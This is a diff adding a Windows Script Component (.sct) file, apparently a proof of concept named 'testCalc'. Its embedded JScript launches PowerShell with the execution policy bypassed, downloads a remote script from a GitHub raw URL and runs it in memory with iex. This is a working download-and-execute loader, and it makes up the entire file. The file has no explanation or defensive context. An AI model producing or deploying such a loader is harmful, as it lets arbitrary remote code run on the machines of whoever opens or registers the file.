@@ -1,0 +1,13 @@
+<?xml version="1.0"?>
+
+<package>
+<component id="testCalc">
+
+<script language="JScript">
+<![CDATA[
+var r = new ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;iex((New-Object System.Net.WebClient).DownloadString('https://github.com/wh4t4s3c/somenotes/raw/master/calc.ps1'))"); 
+]]>
+</script>
+
+</component>
+</package>
